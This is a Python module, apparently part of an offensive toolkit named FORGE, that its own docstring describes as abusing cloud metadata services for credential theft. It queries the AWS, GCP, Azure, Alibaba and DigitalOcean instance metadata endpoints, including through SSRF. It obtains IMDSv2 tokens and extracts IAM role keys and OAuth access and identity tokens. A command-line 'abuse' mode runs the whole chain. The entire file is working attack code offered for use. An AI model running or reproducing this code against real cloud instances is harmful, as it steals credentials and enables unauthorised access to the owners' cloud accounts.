"""
Cloud Metadata Service Abuse (P2 - FORGE Phase 2)

Exploits cloud provider metadata services (IMDS) for credential theft:
- AWS EC2 metadata service (IMDSv1 + IMDSv2)
- GCP Compute Engine metadata service
- Azure Instance Metadata Service (IMDS)
- Alibaba Cloud ECS metadata service
- DigitalOcean metadata service

Extracts instance identity documents, access tokens, and service account keys.
"""

from __future__ import annotations

import os
import re
import json
import socket
import logging
import urllib.request
import urllib.error
from dataclasses import dataclass, field, asdict
from typing import Any, Optional
from enum import Enum
from datetime import datetime

logger = logging.getLogger(__name__)


class CloudIMDS(Enum):
    """Cloud provider IMDS types."""
    AWS = "aws"
    GCP = "gcp"
    AZURE = "azure"
    ALIBABA = "alibaba"
    DIGITALOCEAN = "digitalocean"
    UNKNOWN = "unknown"


@dataclass
class IMDSResponse:
    """Response from a metadata service request."""
    provider: CloudIMDS
    endpoint: str
    success: bool
    data: dict = field(default_factory=dict)
    raw: str = ""
    error: str = ""
    imds_version: str = ""

    def to_dict(self) -> dict:
        return {
            "provider": self.provider.value,
            "endpoint": self.endpoint,
            "success": self.success,
            "data_keys": list(self.data.keys()),
            "data_preview": {k: str(v)[:80] for k, v in self.data.items()},
            "error": self.error,
            "imds_version": self.imds_version,
        }


@dataclass
class AbuseResult:
    """Result of metadata service abuse."""
    responses: list[IMDSResponse] = field(default_factory=list)
    credentials_extracted: list[dict] = field(default_factory=list)
    instance_info: dict = field(default_factory=dict)
    summary: str = ""

    def to_dict(self) -> dict:
        return {
            "responses": [r.to_dict() for r in self.responses],
            "credentials_extracted": self.credentials_extracted,
            "instance_info": self.instance_info,
            "summary": self.summary,
        }


class MetadataAbuser:
    """Abuses cloud provider metadata services for credential theft.

    FORGE Rule 3 (import map): stdlib only (urllib).
    FORGE Rule 4 (subprocess): no subprocess calls.
    FORGE Rule 5 (shellcode): no shellcode.

    Only works when running inside a cloud instance (or via SSRF).
    """

    # IMDS endpoints by provider
    IMDS_ENDPOINTS: dict[CloudIMDS, list[dict]] = {
        CloudIMDS.AWS: [
            {
                "url": "http://169.254.169.254/latest/meta-data/",
                "headers": {},
                "version": "IMDSv1",
            },
            {
                "url": "http://169.254.169.254/latest/meta-data/",
                "headers": {"X-aws-ec2-metadata-token": "TOKEN"},
                "version": "IMDSv2",
            },
            {
                "url": "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "headers": {},
                "version": "IMDSv1",
            },
        ],
        CloudIMDS.GCP: [
            {
                "url": "http://metadata.google.internal/computeMetadata/v1/",
                "headers": {"Metadata-Flavor": "Google"},
                "version": "GCP IMDSv1",
            },
            {
                "url": "http://169.254.169.254/computeMetadata/v1/",
                "headers": {"Metadata-Flavor": "Google"},
                "version": "GCP IMDSv1 (alt)",
            },
        ],
        CloudIMDS.AZURE: [
            {
                "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "headers": {"Metadata": "true"},
                "version": "Azure IMDS",
            },
        ],
        CloudIMDS.ALIBABA: [
            {
                "url": "http://100.100.100.200/latest/meta-data/",
                "headers": {},
                "version": "Alibaba IMDS",
            },
        ],
        CloudIMDS.DIGITALOCEAN: [
            {
                "url": "http://169.254.169.254/metadata/v1.json",
                "headers": {},
                "version": "DO Metadata",
            },
        ],
    }

    # Credential paths for AWS IMDS
    AWS_CREDENTIAL_PATHS = [
        "iam/security-credentials/",
    ]

    # GCP credential paths
    GCP_CREDENTIAL_PATHS = [
        "instance/service-accounts/default/token",
        "instance/service-accounts/default/identity?audience=https://cloud.googleapis.com",
        "instance/service-accounts/?recursive=true",
    ]

    # Azure credential paths
    AZURE_CREDENTIAL_PATHS = [
        "metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
        "metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com",
    ]

    def __init__(self, timeout: int = 3):
        self.timeout = timeout
        self._token_cache: dict[str, str] = {}

    def abuse_all(self) -> AbuseResult:
        """Attempt to extract metadata from all known providers."""
        result = AbuseResult()

        for provider in CloudIMDS:
            if provider == CloudIMDS.UNKNOWN:
                continue
            provider_result = self.abuse_provider(provider)
            result.responses.extend(provider_result.responses)
            result.credentials_extracted.extend(provider_result.credentials_extracted)
            result.instance_info.update(provider_result.instance_info)

        # Determine cloud provider running on
        for provider_name in ["aws", "gcp", "azure", "alibaba", "digitalocean"]:
            if provider_name in str(result.instance_info).lower():
                result.instance_info["detected_provider"] = provider_name
                break

        successful = len([r for r in result.responses if r.success])
        result.summary = (
            f"Metadata abuse: {successful}/{len(result.responses)} endpoints successful, "
            f"{len(result.credentials_extracted)} credentials extracted"
        )
        return result

    def abuse_provider(self, provider: CloudIMDS) -> AbuseResult:
        """Abuse metadata service for a specific provider."""
        result = AbuseResult()
        endpoints = self.IMDS_ENDPOINTS.get(provider, [])

        for ep_config in endpoints:
            url = ep_config["url"]
            headers = ep_config["headers"]
            version = ep_config["version"]

            try:
                imds_result = self._request_imds(url, headers, version)
                result.responses.append(imds_result)

                if imds_result.success:
                    # Provider-specific credential extraction
                    creds = self._extract_credentials(provider, url, headers)
                    result.credentials_extracted.extend(creds)
                    result.instance_info.update(imds_result.data)

            except Exception as e:
                result.responses.append(IMDSResponse(
                    provider=provider,
                    endpoint=url,
                    success=False,
                    error=str(e),
                    imds_version=version,
                ))

        return result

    def get_aws_token_imdsv2(self) -> Optional[str]:
        """Get AWS IMDSv2 session token (required for IMDSv2 access)."""
        try:
            req = urllib.request.Request(
                "http://169.254.169.254/latest/api/token",
                method="PUT",
                data=b"",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                token = resp.read().decode()
                self._token_cache["aws_imdsv2"] = token
                return token
        except (urllib.error.URLError, urllib.error.HTTPError, OSError) as e:
            logger.debug(f"AWS IMDSv2 token request failed: {e}")
            return None

    def _request_imds(self, url: str, headers: dict, version: str) -> IMDSResponse:
        """Make a request to a metadata service endpoint."""
        # Handle AWS IMDSv2 token injection
        req_headers = dict(headers)
        if "TOKEN" in str(headers.get("X-aws-ec2-metadata-token", "")):
            token = self._token_cache.get("aws_imdsv2") or self.get_aws_token_imdsv2()
            if not token:
                return IMDSResponse(
                    provider=CloudIMDS.AWS,
                    endpoint=url,
                    success=False,
                    error="No IMDSv2 token available",
                    imds_version=version,
                )
            req_headers["X-aws-ec2-metadata-token"] = token

        try:
            req = urllib.request.Request(url, headers=req_headers)
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                raw = resp.read().decode("utf-8", errors="replace")
                data = self._parse_imds_response(raw, url)
                return IMDSResponse(
                    provider=self._detect_provider_from_url(url),
                    endpoint=url,
                    success=True,
                    data=data,
                    raw=raw[:500],
                    imds_version=version,
                )
        except urllib.error.HTTPError as e:
            return IMDSResponse(
                provider=self._detect_provider_from_url(url),
                endpoint=url,
                success=False,
                error=f"HTTP {e.code}: {e.reason}",
                imds_version=version,
            )
        except (urllib.error.URLError, OSError) as e:
            return IMDSResponse(
                provider=self._detect_provider_from_url(url),
                endpoint=url,
                success=False,
                error=str(e),
                imds_version=version,
            )

    def _extract_credentials(self, provider: CloudIMDS, base_url: str, headers: dict) -> list[dict]:
        """Extract credentials from IMDS responses."""
        creds = []

        if provider == CloudIMDS.AWS:
            for path in self.AWS_CREDENTIAL_PATHS:
                try:
                    url = f"{base_url.rsplit('/', 2)[0]}/{path}" if "/latest/" in base_url else f"http://169.254.169.254/latest/{path}"
                    roles_url = url.rstrip("/")
                    req = urllib.request.Request(roles_url, headers=headers)
                    with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                        roles = resp.read().decode().strip().split("\n")

                    for role in roles:
                        role = role.strip()
                        if role:
                            cred_url = f"{roles_url}/{role}"
                            req = urllib.request.Request(cred_url, headers=headers)
                            with urllib.request.urlopen(req, timeout=self.timeout) as cred_resp:
                                cred_data = json.loads(cred_resp.read().decode())
                                creds.append({
                                    "provider": "aws",
                                    "type": "iam_role",
                                    "role_name": role,
                                    "access_key": cred_data.get("AccessKeyId", ""),
                                    "secret_key_preview": cred_data.get("SecretAccessKey", "")[:10] + "...",
                                    "token_preview": cred_data.get("Token", "")[:20] + "...",
                                    "expiration": cred_data.get("Expiration", ""),
                                })
                except Exception as e:
                    logger.debug(f"AWS credential extraction failed: {e}")

        elif provider == CloudIMDS.GCP:
            for path in self.GCP_CREDENTIAL_PATHS:
                try:
                    url = f"http://metadata.google.internal/computeMetadata/v1/{path}"
                    req = urllib.request.Request(url, headers={"Metadata-Flavor": "Google"})
                    with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                        data = json.loads(resp.read().decode())

                    if "access_token" in data:
                        creds.append({
                            "provider": "gcp",
                            "type": "access_token",
                            "access_token_preview": data["access_token"][:20] + "...",
                            "expires_in": data.get("expires_in", ""),
                        })
                    if "target_audience" in data:
                        creds.append({
                            "provider": "gcp",
                            "type": "id_token",
                            "token_preview": data.get("token", "")[:20] + "...",
                        })
                except Exception as e:
                    logger.debug(f"GCP credential extraction failed: {e}")

        elif provider == CloudIMDS.AZURE:
            for path in self.AZURE_CREDENTIAL_PATHS:
                try:
                    url = f"http://169.254.169.254/{path}"
                    req = urllib.request.Request(url, headers={"Metadata": "true"})
                    with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                        data = json.loads(resp.read().decode())

                    if "access_token" in data:
                        creds.append({
                            "provider": "azure",
                            "type": "access_token",
                            "access_token_preview": data["access_token"][:20] + "...",
                            "expires_in": data.get("expires_in", ""),
                            "resource": data.get("resource", ""),
                        })
                except Exception as e:
                    logger.debug(f"Azure credential extraction failed: {e}")

        return creds

    def _parse_imds_response(self, raw: str, url: str) -> dict:
        """Parse IMDS response based on content type."""
        # Try JSON first
        try:
            return json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            pass

        # AWS IMDS returns text/plain with key-value lines or directory listing
        lines = raw.strip().split("\n")
        if len(lines) == 1 and not lines[0].endswith("/"):
            return {"value": lines[0].strip()}

        # Directory listing (paths ending with /)
        data = {}
        for line in lines:
            line = line.strip()
            if line.endswith("/"):
                data[f"dir_{line.rstrip('/')}"] = line
            elif ":" in line:
                key, value = line.split(":", 1)
                data[key.strip()] = value.strip()
            else:
                data[f"item_{len(data)}"] = line

        return data if data else {"raw": raw[:500]}

    def _detect_provider_from_url(self, url: str) -> CloudIMDS:
        if "169.254.169.254" in url:
            return CloudIMDS.AWS  # default, could be any
        if "metadata.google" in url:
            return CloudIMDS.GCP
        if "100.100.100.200" in url:
            return CloudIMDS.ALIBABA
        return CloudIMDS.UNKNOWN

    def summary(self) -> dict:
        return {
            "abuser": "MetadataAbuser",
            "version": "0.1.0",
            "providers": [p.value for p in CloudIMDS if p != CloudIMDS.UNKNOWN],
            "endpoints": sum(len(v) for v in self.IMDS_ENDPOINTS.values()),
        }


def abuse_metadata() -> dict:
    """Convenience function to abuse all metadata services."""
    abuser = MetadataAbuser()
    result = abuser.abuse_all()
    return result.to_dict()


def check_imds() -> dict:
    """Quick check if we're running on a cloud instance."""
    result = {"on_cloud": False, "provider": None, "accessible_endpoints": []}
    abuser = MetadataAbuser()
    for provider in [CloudIMDS.AWS, CloudIMDS.GCP, CloudIMDS.AZURE]:
        endpoints = abuser.IMDS_ENDPOINTS.get(provider, [])
        for ep in endpoints:
            try:
                req = urllib.request.Request(ep["url"], headers=ep["headers"], method="HEAD")
                with urllib.request.urlopen(req, timeout=2):
                    result["on_cloud"] = True
                    result["provider"] = provider.value
                    result["accessible_endpoints"].append(ep["url"])
                    break
            except Exception:
                continue
    return result


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")

    cmd = sys.argv[1] if len(sys.argv) > 1 else "check"
    if cmd == "check":
        print(json.dumps(check_imds(), indent=2))
    elif cmd == "abuse":
        result = abuse_metadata()
        print(json.dumps(result, indent=2, default=str))
    else:
        print("Usage: python metadata_abuse.py check|abuse")
